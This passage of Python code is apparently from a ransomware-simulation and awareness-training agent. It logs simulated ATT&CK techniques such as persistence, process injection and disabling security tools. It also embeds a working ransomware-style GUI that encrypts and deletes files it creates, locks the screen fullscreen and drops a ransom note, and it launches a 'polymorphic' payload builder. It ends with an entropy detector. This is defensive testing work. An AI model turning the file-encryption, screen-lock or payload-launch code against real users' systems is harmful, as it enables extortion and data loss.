        self._add_event("REGISTRY_PERSISTENCE", {
            "technique": "T1547.001",
            "keys_modified": run_keys,
            "simulated": True
        })
        
        # Service creation simulation (T1543.003)
        service_name = "WindowsSecurityService"
        service_path = r"C:\Windows\System32\svchost_update.exe"
        
        self.iocs.append({
            "ioc_type": "SERVICE",
            "value": service_name,
            "context": "malicious_service_creation"
        })
        
        self._add_event("SERVICE_CREATION", {
            "technique": "T1543.003",
            "service_name": service_name,
            "binary_path": service_path,
            "simulated": True
        })
        
        # Scheduled task simulation (T1053.005)
        task_name = "SystemMaintenanceTask"
        task_command = r"C:\Windows\Temp\update.exe"
        
        self.iocs.append({
            "ioc_type": "SCHEDULED_TASK",
            "value": task_name,
            "context": "persistence_scheduled_task"
        })
        
        self._add_event("SCHEDULED_TASK", {
            "technique": "T1053.005",
            "task_name": task_name,
            "command": task_command,
            "trigger": "daily",
            "simulated": True
        })
        
        self.metrics["persistence_mechanisms"] = len(run_keys) + 2
        
        return f"Registry persistence: {len(run_keys)} run keys + service + scheduled task"
    
    def _simulate_process_injection(self) -> str:
        """
        Simulate process injection techniques (T1055).
        Logs indicators without actual injection.
        """
        self.logger.warning("[MITRE ATT&CK] T1055: Process Injection Simulation")
        
        # Process hollowing simulation (T1055.012)
        target_processes = [
            "svchost.exe",
            "explorer.exe",
            "notepad.exe"
        ]
        
        for proc in target_processes:
            self.iocs.append({
                "ioc_type": "PROCESS",
                "value": proc,
                "context": "process_hollowing_target"
            })
        
        self._add_event("PROCESS_HOLLOWING", {
            "technique": "T1055.012",
            "target_processes": target_processes,
            "injected_code_size": 65536,
            "simulated": True
        })
        
        # DLL injection simulation (T1055.001)
        malicious_dll = r"C:\Windows\Temp\payload.dll"
        
        self.iocs.append({
            "ioc_type": "FILE_PATH",
            "value": malicious_dll,
            "context": "malicious_dll_injection"
        })
        
        self._add_event("DLL_INJECTION", {
            "technique": "T1055.001",
            "dll_path": malicious_dll,
            "target_process": "explorer.exe",
            "injection_method": "CreateRemoteThread",
            "simulated": True
        })
        
        # Reflective DLL loading (T1620)
        self._add_event("REFLECTIVE_LOADING", {
            "technique": "T1620",
            "module_name": "reflective_loader.dll",
            "in_memory": True,
            "simulated": True
        })
        
        self.metrics["injection_attempts"] = len(target_processes)
        
        return f"Process injection: {len(target_processes)} targets (hollowing + DLL injection)"
    
    def _simulate_defense_evasion(self) -> str:
        """
        Simulate defense evasion techniques (T1070, T1562).
        Logs anti-forensics and security tool tampering.
        """
        self.logger.warning("[MITRE ATT&CK] T1070/T1562: Defense Evasion Simulation")
        
        # Log clearing simulation (T1070.001)
        event_logs = [
            "Security",
            "System",
            "Application",
            "Microsoft-Windows-Sysmon/Operational"
        ]
        
        for log in event_logs:
            self.iocs.append({
                "ioc_type": "EVENT_LOG",
                "value": log,
                "context": "log_clearing"
            })
        
        self._add_event("LOG_CLEARING", {
            "technique": "T1070.001",
            "logs_cleared": event_logs,
            "simulated": True
        })
        
        # Timestomping simulation (T1070.006)
        timestomp_files = [
            r"C:\Windows\Temp\malware.exe",
            r"C:\Users\Public\payload.dll"
        ]
        
        for file_path in timestomp_files:
            self.iocs.append({
                "ioc_type": "FILE_PATH",
                "value": file_path,
                "context": "timestomping"
            })
        
        self._add_event("TIMESTOMPING", {
            "technique": "T1070.006",
            "files_modified": timestomp_files,
            "new_timestamp": "2020-01-01 00:00:00",
            "simulated": True
        })
        
        # Disable security tools (T1562.001)
        security_tools = [
            "Windows Defender",
            "Sysmon",
            "Windows Firewall"
        ]
        
        for tool in security_tools:
            self.iocs.append({
                "ioc_type": "SECURITY_TOOL",
                "value": tool,
                "context": "security_tool_tampering"
            })
        
        self._add_event("DISABLE_SECURITY", {
            "technique": "T1562.001",
            "tools_disabled": security_tools,
            "methods": ["service_stop", "registry_modification", "policy_change"],
            "simulated": True
        })
        
        self.metrics["evasion_techniques"] = len(event_logs) + len(security_tools)
        
        return f"Defense evasion: {len(event_logs)} logs cleared + {len(security_tools)} security tools disabled"
    
    def _launch_gui_ransomware(self):
        """Launch GUI ransomware popup in separate process."""
        try:
            # Get absolute path to GUI script - try multiple locations
            agent_dir = Path(__file__).parent.resolve()
            ransomrun_root = agent_dir.parent.resolve()
            
            # Priority 1: Advanced professional ransomware template
            gui_script = ransomrun_root / "Advanced_Simulation" / "ransomware_template.py"
            
            # Priority 2: Legacy WannaCry-style GUI
            if not gui_script.exists():
                gui_script = ransomrun_root / "Advanced_Simulation" / "wana_decrypt0r_gui.py"
            
            # Priority 3: Try relative to current working directory
            if not gui_script.exists():
                gui_script = Path.cwd() / "Advanced_Simulation" / "ransomware_template.py"
            
            # Priority 4: Try in same directory as agent
            if not gui_script.exists():
                gui_script = agent_dir / "ransomware_template.py"
            
            if not gui_script.exists():
                self.logger.warning(f"GUI script not found. Using embedded GUI instead.")
                self._launch_embedded_gui()
                return
            
            self.logger.info(f"Found GUI script: {gui_script}")
            
            # Test if script can be executed directly first
            try:
                test_result = subprocess.run(
                    [sys.executable, str(gui_script), "--test"],
                    capture_output=True,
                    text=True,
                    timeout=5,
                    cwd=str(gui_script.parent)
                )
                self.logger.info(f"GUI script test result: {test_result.returncode}")
                if test_result.stdout:
                    self.logger.info(f"GUI script stdout: {test_result.stdout}")
                if test_result.stderr:
                    self.logger.info(f"GUI script stderr: {test_result.stderr}")
            except subprocess.TimeoutExpired:
                self.logger.info("GUI script test timed out (expected for GUI)")
            except Exception as e:
                self.logger.warning(f"GUI script test failed: {e}")
            
            # Launch in separate process with new console window
            if platform.system() == "Windows":
                # Windows: Launch with pythonw to avoid console or use CREATE_NEW_CONSOLE
                process = subprocess.Popen(
                    [sys.executable, str(gui_script)],
                    creationflags=subprocess.CREATE_NEW_CONSOLE,
                    cwd=str(gui_script.parent)
                )
                self.logger.info(f"GUI process started with PID: {process.pid}")
                
                # Wait a moment and check if process is still running
                time.sleep(2)
                if process.poll() is None:
                    self.logger.info("GUI process is still running (window should be visible)")
                else:
                    self.logger.warning(f"GUI process exited with code: {process.poll()}")
                    # Try to get output
                    try:
                        stdout, stderr = process.communicate(timeout=1)
                        if stdout:
                            self.logger.warning(f"GUI stdout: {stdout}")
                        if stderr:
                            self.logger.warning(f"GUI stderr: {stderr}")
                    except:
                        pass
            else:
                # Linux/Mac: Launch in background
                process = subprocess.Popen(
                    [sys.executable, str(gui_script)],
                    cwd=str(gui_script.parent),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.logger.info(f"GUI process started with PID: {process.pid}")
            
            self.logger.info("Advanced GUI ransomware popup launched successfully")
            self._add_event("GUI_RANSOMWARE_LAUNCHED", {
                "technique": "T1486",
                "gui_script": str(gui_script),
                "gui_type": "professional_polymorphic" if "ransomware_template" in str(gui_script) else "wannacry_style",
                "visual_impact": True,
                "features": ["fullscreen_takeover", "countdown_timer", "file_encryption_log", "restore_capability"],
                "process_id": process.pid
            })
            
        except Exception as e:
            self.logger.error(f"Failed to launch GUI ransomware: {e}")
            self.logger.exception("GUI launch error details")
            # Fallback to embedded GUI
            self._launch_embedded_gui()
    
    def _launch_embedded_gui(self):
        """Launch embedded ransomware GUI popup - guaranteed to work on victim."""
        try:
            self.logger.info("Launching embedded ransomware GUI popup...")
            
            # Check if ransomware_gui.py exists in same directory
            agent_dir = os.path.dirname(os.path.abspath(__file__))
            gui_script = os.path.join(agent_dir, "ransomware_gui.py")
            
            if os.path.exists(gui_script):
                self.logger.info(f"Found ransomware_gui.py at: {gui_script}")
                if platform.system() == "Windows":
                    process = subprocess.Popen(
                        ["pythonw", gui_script],
                        creationflags=subprocess.CREATE_NEW_CONSOLE
                    )
                else:
                    process = subprocess.Popen(["python3", gui_script])
                self.logger.info(f"Ransomware GUI launched with PID: {process.pid}")
                return
            
            self.logger.warning("ransomware_gui.py not found, creating embedded version...")
            
            # Create embedded GUI script content
            gui_code = '''# -*- coding: utf-8 -*-
import os, sys, time, threading, hashlib, secrets, json
import tkinter as tk
from tkinter import messagebox, scrolledtext, simpledialog
from datetime import datetime

BG_COLOR = "#1a1a2e"
HEADER_COLOR = "#c70039"
TXT_COLOR = "#00ff41"
WARNING_COLOR = "#f39c12"
TIMER_COLOR = "#e74c3c"
MAGIC = b"DWCRYPT01"
SALT_SIZE = 32
KEY_SIZE = 32
ITERATIONS = 100000
ENC_EXT = ".dwcrypt"
PASSWORD = "DontWannaCry2025"

def derive_key(pw, salt):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)

def xor_cipher(data, key):
    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, key_extended))

def encrypt_file(path, pw):
    try:
        with open(path, "rb") as f:
            data = f.read()
        salt = secrets.token_bytes(SALT_SIZE)
        key = derive_key(pw, salt)
        encrypted = xor_cipher(data, key)
        meta = json.dumps({"name": os.path.basename(path), "size": len(data)}).encode()
        with open(path + ENC_EXT, "wb") as f:
            f.write(MAGIC + salt + len(meta).to_bytes(4, "big") + meta + encrypted)
        os.remove(path)
        return True
    except:
        return False

def decrypt_file(path, pw):
    try:
        with open(path, "rb") as f:
            content = f.read()
        if not content.startswith(MAGIC):
            return False, None
        offset = len(MAGIC)
        salt = content[offset:offset + SALT_SIZE]
        offset += SALT_SIZE
        meta_len = int.from_bytes(content[offset:offset + 4], "big")
        offset += 4
        meta = json.loads(content[offset:offset + meta_len])
        offset += meta_len
        key = derive_key(pw, salt)
        decrypted = xor_cipher(content[offset:], key)
        original_path = os.path.join(os.path.dirname(path), meta["name"])
        with open(original_path, "wb") as f:
            f.write(decrypted)
        os.remove(path)
        return True, meta["name"]
    except:
        return False, None

def create_opener(enc_path, opener_path, password):
    code = """import os, hashlib, json, tkinter as tk
from tkinter import simpledialog, messagebox
MAGIC = b"DWCRYPT01"
SALT_SIZE = 32
KEY_SIZE = 32
ITERATIONS = 100000
ENC_FILE = r"%s"
CORRECT_PW = "%s"
def derive_key(pw, salt):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)
def xor_cipher(data, key):
    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, key_extended))
root = tk.Tk()
root.withdraw()
if not os.path.exists(ENC_FILE):
    messagebox.showerror("Error", "Encrypted file not found!")
else:
    pw = simpledialog.askstring("Password Required", "This file is ENCRYPTED.\\nEnter password to view:", show="*")
    if pw == CORRECT_PW:
        with open(ENC_FILE, "rb") as f:
            c = f.read()
        offset = len(MAGIC)
        salt = c[offset:offset + SALT_SIZE]
        offset += SALT_SIZE
        meta_len = int.from_bytes(c[offset:offset + 4], "big")
        offset += 4
        meta = json.loads(c[offset:offset + meta_len])
        offset += meta_len
        decrypted = xor_cipher(c[offset:], derive_key(pw, salt))
        messagebox.showinfo("DECRYPTED: " + meta["name"], decrypted.decode("utf-8", "ignore")[:2000])
    elif pw:
        messagebox.showerror("ACCESS DENIED", "Wrong password!")
""" % (enc_path, password)
    with open(opener_path, "w") as f:
        f.write(code)

def create_master_decryptor(folder, password):
    dec_path = os.path.join(folder, "DECRYPT_ALL_FILES.pyw")
    code = """import os, hashlib, json, tkinter as tk
from tkinter import simpledialog, messagebox
MAGIC = b"DWCRYPT01"
SALT_SIZE = 32
KEY_SIZE = 32
ITERATIONS = 100000
CORRECT_PW = "%s"
def derive_key(pw, salt):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)
def xor_cipher(data, key):
    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, key_extended))
def decrypt_file(filepath, pw):
    try:
        with open(filepath, "rb") as f:
            c = f.read()
        if not c.startswith(MAGIC):
            return False
        offset = len(MAGIC)
        salt = c[offset:offset + SALT_SIZE]
        offset += SALT_SIZE
        meta_len = int.from_bytes(c[offset:offset + 4], "big")
        offset += 4
        meta = json.loads(c[offset:offset + meta_len])
        offset += meta_len
        decrypted = xor_cipher(c[offset:], derive_key(pw, salt))
        original = os.path.join(os.path.dirname(filepath), meta["name"])
        with open(original, "wb") as f:
            f.write(decrypted)
        os.remove(filepath)
        return True
    except:
        return False
root = tk.Tk()
root.withdraw()
pw = simpledialog.askstring("Decrypt All Files", "Enter decryption password:", show="*")
if pw == CORRECT_PW:
    folder = os.path.dirname(os.path.abspath(__file__))
    count = 0
    for f in os.listdir(folder):
        if f.endswith(".dwcrypt"):
            if decrypt_file(os.path.join(folder, f), pw):
                count += 1
    for f in os.listdir(folder):
        if f.endswith("_LOCKED.pyw"):
            os.remove(os.path.join(folder, f))
    messagebox.showinfo("Success", "Decrypted " + str(count) + " files!")
elif pw:
    messagebox.showerror("Failed", "Wrong password!")
""" % password
    with open(dec_path, "w") as f:
        f.write(code)

class RansomwareGUI:
    def __init__(self, root):
        self.root = root
        self.countdown_seconds = 72 * 3600
        self.encrypted_files = []
        self._setup_window()
        self._create_ui()
        self._start_simulation()
        self._start_countdown()

    def _setup_window(self):
        self.root.title("SYSTEM COMPROMISED")
        self.root.configure(bg=BG_COLOR)
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Escape>", lambda e: self._show_decrypt())

    def _create_ui(self):
        header = tk.Frame(self.root, bg=HEADER_COLOR, height=100)
        header.pack(fill="x")
        header.pack_propagate(False)
        tk.Label(header, text="[!] CRITICAL SECURITY ALERT [!]", bg=HEADER_COLOR, fg="white", font=("Consolas", 42, "bold")).pack(expand=True)
        main = tk.Frame(self.root, bg=BG_COLOR)
        main.pack(fill="both", expand=True, padx=80, pady=30)
        tk.Label(main, text=">> Team: DONT WANNA CRY <<", bg=BG_COLOR, fg=WARNING_COLOR, font=("Consolas", 28, "bold")).pack(pady=15)
        tk.Frame(main, bg=WARNING_COLOR, height=2).pack(fill="x", pady=10)
        for i, msg in enumerate(["YOUR SYSTEM HAS BEEN COMPROMISED", "All files encrypted with military-grade encryption.", "Enter the correct password to decrypt your files."]):
            tk.Label(main, text=msg, bg=BG_COLOR, fg=TIMER_COLOR if i==0 else TXT_COLOR, font=("Arial", 22 if i==0 else 14, "bold" if i==0 else "normal")).pack(pady=4)
        timer_frame = tk.Frame(main, bg="#0d0d0d", bd=3, relief="ridge")
        timer_frame.pack(pady=30, ipadx=40, ipady=20)
        tk.Label(timer_frame, text="TIME REMAINING:", bg="#0d0d0d", fg="white", font=("Arial", 12)).pack()
        self.timer_label = tk.Label(timer_frame, text="72:00:00", bg="#0d0d0d", fg=TIMER_COLOR, font=("Consolas", 72, "bold"))
        self.timer_label.pack()
        log_frame = tk.Frame(main, bg=BG_COLOR)
        log_frame.pack(fill="both", expand=True, pady=15)
        tk.Label(log_frame, text="[ENCRYPTION LOG]", bg=BG_COLOR, fg=WARNING_COLOR, font=("Consolas", 14, "bold")).pack()
        self.log_text = scrolledtext.ScrolledText(log_frame, bg="#0d0d0d", fg=TXT_COLOR, font=("Consolas", 10), height=8, state="disabled")
        self.log_text.pack(fill="both", expand=True, pady=5)
        tk.Button(main, text="[ ENTER PASSWORD TO DECRYPT ]", font=("Consolas", 20, "bold"), bg="#27ae60", fg="white", padx=40, pady=15, command=self._show_decrypt, cursor="hand2", bd=0).pack(pady=20)
        pw_frame = tk.Frame(main, bg="#2d2d44", bd=2, relief="ridge")
        pw_frame.pack(pady=10, ipadx=20, ipady=10)
        tk.Label(pw_frame, text="DECRYPTION PASSWORD:", bg="#2d2d44", fg=WARNING_COLOR, font=("Consolas", 12, "bold")).pack()
        tk.Label(pw_frame, text=PASSWORD, bg="#2d2d44", fg="#00ff00", font=("Consolas", 24, "bold")).pack()
        # Awareness Message Section
        disclaimer = tk.Frame(main, bg="#1a0a0a", bd=2, relief="ridge")
        disclaimer.pack(fill="x", side="bottom", pady=10)
        tk.Label(disclaimer, text="💀 IF YOU DON'T WANNA CRY, DON'T LET YOUR GUARD DOWN! 💀", bg="#1a0a0a", fg="#ff4444", font=("Impact", 16)).pack(pady=5)
        tk.Label(disclaimer, text="This could have been real. Your files, your memories, your work — gone in seconds.", bg="#1a0a0a", fg="#ff9999", font=("Arial", 11, "italic")).pack()
        tk.Label(disclaimer, text="One wrong click is all it takes. Stay vigilant. Stay protected. Stay safe.", bg="#1a0a0a", fg="#ffcc00", font=("Arial", 10, "bold")).pack()
        tk.Label(disclaimer, text="💀 RansomRun - Security Awareness Training 💀 | SIMULATION MODE | ESC to decrypt", bg="#1a0a0a", fg="#666666", font=("Arial", 9)).pack(pady=5)

    def _log(self, msg, tag="INFO"):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, "[" + datetime.now().strftime("%H:%M:%S") + "] [" + tag + "] " + msg + "\\n")
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")

    def _start_countdown(self):
        def update():
            if self.countdown_seconds > 0:
                h, r = divmod(self.countdown_seconds, 3600)
                m, s = divmod(r, 60)
                self.timer_label.config(text="%02d:%02d:%02d" % (h, m, s))
                self.countdown_seconds -= 1
                self.root.after(1000, update)
        update()

    def _start_simulation(self):
        def run():
            self._log("RANSOMWARE SIMULATION INITIATED", "INIT")
            self._log("Creating target files on Desktop...", "INIT")
            time.sleep(1)
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            target = os.path.join(desktop, "ENCRYPTED_FILES")
            os.makedirs(target, exist_ok=True)
            test_files = [
                ("Financial_Report_2025.txt", "CONFIDENTIAL FINANCIAL REPORT 2025\\n==================================================\\nRevenue: $1,250,000\\nExpenses: $890,000\\nProfit: $360,000\\nBank Account: 1234-5678-9012\\nPassword: SecurePass123"),
                ("Employee_Database.csv", "ID,Name,SSN,Salary,Department\\n001,John Smith,123-45-6789,75000,Engineering\\n002,Jane Doe,987-65-4321,82000,Marketing\\n003,Bob Wilson,456-78-9012,68000,Sales"),
                ("Password_List.txt", "SYSTEM PASSWORDS - TOP SECRET\\n==================================================\\nAdmin: P@ssw0rd123\\nDatabase: DbSecure456\\nVPN: VpnAccess789\\nEmail: Mail2025Pass"),
                ("Project_Secrets.txt", "PROJECT PHOENIX - CLASSIFIED\\n==================================================\\nLaunch Date: Q2 2025\\nBudget: $2.5M\\nKey Partners: Confidential\\nAPI Keys: sk-xxxx-yyyy-zzzz"),
            ]
            created = []
            for fname, content in test_files:
                fpath = os.path.join(target, fname)
                for old in [fpath, fpath + ENC_EXT, os.path.join(target, os.path.splitext(fname)[0] + "_LOCKED.pyw")]:
                    if os.path.exists(old):
                        os.remove(old)
                with open(fpath, "w") as f:
                    f.write(content)
                created.append((fname, fpath))
                self._log("CREATED: " + fname, "FILE")
                time.sleep(0.2)
            self._log("Created " + str(len(created)) + " sensitive files", "INIT")
            time.sleep(1)
            self._log("Starting encryption with military-grade cipher...", "PROC")
            for fname, fpath in created:
                if encrypt_file(fpath, PASSWORD):
                    enc_path = fpath + ENC_EXT
                    self.encrypted_files.append(enc_path)
                    self._log("ENCRYPTED: " + fname + " -> " + fname + ENC_EXT, "CRYPT")
                    base_name = os.path.splitext(fname)[0]
                    opener_path = os.path.join(target, base_name + "_LOCKED.pyw")
                    create_opener(enc_path, opener_path, PASSWORD)
                    self._log("CREATED: " + base_name + "_LOCKED.pyw (click to decrypt)", "LOCK")
                    time.sleep(0.3)
            create_master_decryptor(target, PASSWORD)
            self._log("Created: DECRYPT_ALL_FILES.pyw", "INFO")
            note_path = os.path.join(desktop, "!!!YOUR_FILES_ARE_ENCRYPTED!!!.txt")
            note = "\\n================================================================================\\n                    YOUR FILES HAVE BEEN ENCRYPTED!\\n                    Team: DONT WANNA CRY\\n================================================================================\\n\\nENCRYPTED FILES LOCATION: Desktop/ENCRYPTED_FILES/\\n\\nHOW TO VIEW ENCRYPTED FILES:\\n1. Double-click any *_LOCKED.pyw file to view that file (requires password)\\n2. Or double-click DECRYPT_ALL_FILES.pyw to restore ALL files\\n\\nDECRYPTION PASSWORD: " + PASSWORD + "\\n\\n================================================================================\\n                    SIMULATION - EDUCATIONAL PURPOSE ONLY\\n================================================================================\\n"
            with open(note_path, "w") as f:
                f.write(note)
            self._log("Ransom note created on Desktop", "INFO")
            self._log("ENCRYPTION COMPLETE: " + str(len(self.encrypted_files)) + " files locked", "DONE")
            self._log("PASSWORD: " + PASSWORD, "KEY")
        threading.Thread(target=run, daemon=True).start()

    def _show_decrypt(self):
        pw = simpledialog.askstring("Decrypt", "Enter decryption password:", show="*", parent=self.root)
        if pw == PASSWORD:
            self._log("Correct password! Decrypting...", "DECRYPT")
            for fp in self.encrypted_files:
                if os.path.exists(fp):
                    ok, name = decrypt_file(fp, pw)
                    if ok:
                        self._log("RESTORED: " + name, "OK")
            target = os.path.join(os.path.expanduser("~"), "Desktop", "ENCRYPTED_FILES")
            if os.path.exists(target):
                for f in os.listdir(target):
                    if f.endswith("_LOCKED.pyw"):
                        os.remove(os.path.join(target, f))
            messagebox.showinfo("Success", "All files decrypted!\\nSimulation complete.")
            self.root.destroy()
        elif pw:
            messagebox.showerror("Wrong Password", "Incorrect password!")

if __name__ == "__main__":
    root = tk.Tk()
    RansomwareGUI(root)
    root.mainloop()
'''
            
            # Write embedded GUI to temp file with UTF-8 encoding
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
                f.write(gui_code)
                temp_script = f.name
            
            self.logger.info(f"Created embedded GUI script: {temp_script}")
            
            # Launch the embedded GUI
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    [sys.executable, temp_script],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
            else:
                process = subprocess.Popen(
                    [sys.executable, temp_script],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            self.logger.info(f"Embedded GUI launched with PID: {process.pid}")
            self._add_event("EMBEDDED_GUI_LAUNCHED", {
                "technique": "T1486",
                "gui_type": "embedded_ransomware_popup",
                "process_id": process.pid
            })
            
        except Exception as e:
            self.logger.error(f"Failed to launch embedded GUI: {e}")
    
    def _launch_polymorphic_ransomware(self):
        """Launch advanced polymorphic ransomware with builder integration."""
        try:
            # Get absolute path to builder script - try multiple locations
            agent_dir = Path(__file__).parent.resolve()
            ransomrun_root = agent_dir.parent.resolve()
            
            # Priority 1: Advanced Simulation directory
            builder_script = ransomrun_root / "Advanced_Simulation" / "polymorphic_builder.py"
            
            # Priority 2: Try relative to current working directory
            if not builder_script.exists():
                builder_script = Path.cwd() / "Advanced_Simulation" / "polymorphic_builder.py"
            
            # Priority 3: Try in same directory as agent
            if not builder_script.exists():
                builder_script = agent_dir / "polymorphic_builder.py"
            
            if not builder_script.exists():
                self.logger.warning(f"Polymorphic builder not found. Checked paths:")
                self.logger.warning(f"  1. {ransomrun_root / 'Advanced_Simulation' / 'polymorphic_builder.py'}")
                self.logger.warning(f"  2. {Path.cwd() / 'Advanced_Simulation' / 'polymorphic_builder.py'}")
                self.logger.warning(f"  3. {agent_dir / 'polymorphic_builder.py'}")
                # Fallback to direct template execution
                self.logger.info("Falling back to direct GUI execution...")
                self._launch_gui_ransomware()
                return
            
            self.logger.info("Building and launching polymorphic ransomware payload...")
            
            # Build the payload first
            build_result = subprocess.run(
                [sys.executable, str(builder_script), "--auto-build"],
                capture_output=True,
                text=True,
                timeout=30,
                cwd=str(builder_script.parent)
            )
            
            if build_result.returncode == 0:
                self.logger.info("Polymorphic payload built successfully")
                
                # Extract hash from build output if available
                build_output = build_result.stdout
                payload_hash = "unknown"
                if "Payload Hash:" in build_output:
                    for line in build_output.split('\n'):
                        if "Payload Hash:" in line:
                            payload_hash = line.split(":")[1].strip()[:32]
                            break
                
                self._add_event("POLYMORPHIC_BUILD", {
                    "technique": "T1027",
                    "builder_script": str(builder_script),
                    "payload_hash": payload_hash,
                    "mutation_applied": True
                })
                
                # Now execute the generated payload
                payload_script = builder_script.parent / "svc_host_update.py"
                if payload_script.exists():
                    if platform.system() == "Windows":
                        subprocess.Popen(
                            [sys.executable, str(payload_script)],
                            creationflags=subprocess.CREATE_NEW_CONSOLE,
                            cwd=str(payload_script.parent)
                        )
                    else:
                        subprocess.Popen(
                            [sys.executable, str(payload_script)],
                            cwd=str(payload_script.parent),
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                    
                    self.logger.info("Polymorphic ransomware payload executed")
                    self._add_event("POLYMORPHIC_EXECUTION", {
                        "technique": "T1486",
                        "payload_path": str(payload_script),
                        "hash": payload_hash,
                        "evasion_level": "advanced"
                    })
                else:
                    self.logger.warning("Generated payload not found, using template directly")
                    self._launch_gui_ransomware()
            else:
                self.logger.warning(f"Polymorphic build failed: {build_result.stderr}")
                # Fallback to direct template
                self._launch_gui_ransomware()
                
        except subprocess.TimeoutExpired:
            self.logger.error("Polymorphic builder timed out")
            self._launch_gui_ransomware()
        except Exception as e:
            self.logger.error(f"Failed to launch polymorphic ransomware: {e}")
            # Fallback to standard GUI
            self._launch_gui_ransomware()
    
    def test_gui_launch(self):
        """Test method to verify GUI launch functionality."""
        self.logger.info("=" * 50)
        self.logger.info("TESTING GUI LAUNCH FUNCTIONALITY")
        self.logger.info("=" * 50)
        
        try:
            # Test the GUI launch directly
            self._launch_gui_ransomware()
            return (True, "GUI test completed - check logs for details")
        except Exception as e:
            self.logger.exception("GUI test failed")
            return (False, f"GUI test failed: {e}")
    
    def _add_event(self, event_type: str, details: dict):
        """Add an event to the timeline."""
        self.events.append({
            "event_type": event_type,
            "timestamp": datetime.utcnow().isoformat(),
            "details": details
        })
    
    def _count_expected_alerts(self, config: dict) -> int:
        """Estimate number of alerts this scenario should trigger."""
        count = 0
        if config.get("simulate_vssadmin"):
            count += 1
        if config.get("rename_pattern"):
            count += 1
        if config.get("ransom_note"):
            count += 1
        if config.get("simulate_persistence"):
            count += 1
        if config.get("simulate_exfiltration"):
            count += 1
        if config.get("simulate_lateral_movement"):
            count += 2  # Network discovery + lateral movement
        if config.get("simulate_cloud_attack"):
            count += 2  # Cloud discovery + cloud attack
        if config.get("polymorphic_mode"):
            count += 1
        if config.get("simulate_credential_dump"):
            count += 2  # LSASS + SAM access
        if config.get("simulate_registry_persistence"):
            count += 1
        if config.get("simulate_process_injection"):
            count += 1
        if config.get("simulate_defense_evasion"):
            count += 2  # Log clearing + AV disable
        return count
    
    def _report_extended_results(self, run_id: Optional[int]):
        """Report extended forensic results to backend."""
        if not run_id:
            return
        
        try:
            payload = {
                "run_id": run_id,
                "files_affected": self.affected_files[:100],  # Limit to 100
                "iocs": self.iocs[:50],  # Limit to 50
                "metrics": self.metrics,
                "events": self.events
            }
            
            response = requests.post(
                f"{self.backend_url}/api/siem/agent/extended-result",
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                self.logger.info("Extended results reported successfully")
            else:
                self.logger.warning(f"Extended results report failed: {response.status_code}")
                
        except Exception as e:
            self.logger.warning(f"Failed to report extended results: {e}")
    
    # =========================================================================
    # ENTROPY MONITOR & HONEYFILE DECEPTION SENSORS
    # =========================================================================
    
    def _calculate_entropy(self, data: bytes) -> float:
        """
        Calculate Shannon entropy of data.
        Returns value between 0 (uniform) and 8 (random).
        """
        import math
        if not data:
            return 0.0
        
        # Count byte frequencies
        freq = [0] * 256
        for byte in data:
            freq[byte] += 1
        
        # Calculate entropy
        entropy = 0.0
        data_len = len(data)
        for count in freq:
            if count > 0:
                prob = count / data_len
                entropy -= prob * math.log2(prob)
        
        return entropy
    
    def _calculate_file_entropy(self, filepath: str) -> float:
        """Calculate entropy of a file."""
        try:
            with open(filepath, 'rb') as f:
                data = f.read(65536)  # Read first 64KB for efficiency
            return self._calculate_entropy(data)
        except Exception as e:
            self.logger.warning(f"Failed to calculate entropy for {filepath}: {e}")
            return -1.0
    
    def start_entropy_monitor(self, parameters: dict) -> tuple:
        """
        Start entropy-based ransomware detection monitor.
        
        Monitors specified directories for sudden entropy jumps that indicate
        file encryption (ransomware behavior).
        
        Parameters:
            watch_dirs: List of directories to monitor
            entropy_threshold: Minimum entropy jump to trigger alert (default: 3.0)
            high_entropy_threshold: Minimum new entropy to consider suspicious (default: 7.0)
            scan_interval: Seconds between scans (default: 5)
            duration: How long to monitor in seconds (default: 300)
            run_id: Associated run ID for reporting
        """
        watch_dirs = parameters.get("watch_dirs", [TEST_DIR])
        entropy_threshold = parameters.get("entropy_threshold", 3.0)
        high_entropy_threshold = parameters.get("high_entropy_threshold", 7.0)
        scan_interval = parameters.get("scan_interval", 5)
        duration = parameters.get("duration", 300)
        run_id = parameters.get("run_id")
        
        self.logger.info(f"[ENTROPY MONITOR] Starting entropy-based detection")
        self.logger.info(f"[ENTROPY MONITOR] Watching: {watch_dirs}")
        self.logger.info(f"[ENTROPY MONITOR] Threshold: jump >= {entropy_threshold}, new >= {high_entropy_threshold}")
        
        # Initialize baseline entropy values
        file_baselines = {}
        alerts_generated = []
        
        for watch_dir in watch_dirs:
            dir_path = Path(watch_dir)
            if dir_path.exists():
                for filepath in dir_path.rglob("*"):
                    if filepath.is_file():
                        entropy = self._calculate_file_entropy(str(filepath))
                        if entropy >= 0:
                            file_baselines[str(filepath)] = entropy
                            self.logger.debug(f"[ENTROPY MONITOR] Baseline: {filepath.name} = {entropy:.2f}")
        
        self.logger.info(f"[ENTROPY MONITOR] Baseline established for {len(file_baselines)} files")
        
        # Monitor loop
        start_time = time.time()
        scan_count = 0
        
        while time.time() - start_time < duration:
            scan_count += 1
            
            for watch_dir in watch_dirs:
                dir_path = Path(watch_dir)
                if not dir_path.exists():
                    continue
                
                for filepath in dir_path.rglob("*"):
                    if not filepath.is_file():
                        continue
                    
                    filepath_str = str(filepath)
                    new_entropy = self._calculate_file_entropy(filepath_str)
                    
                    if new_entropy < 0:
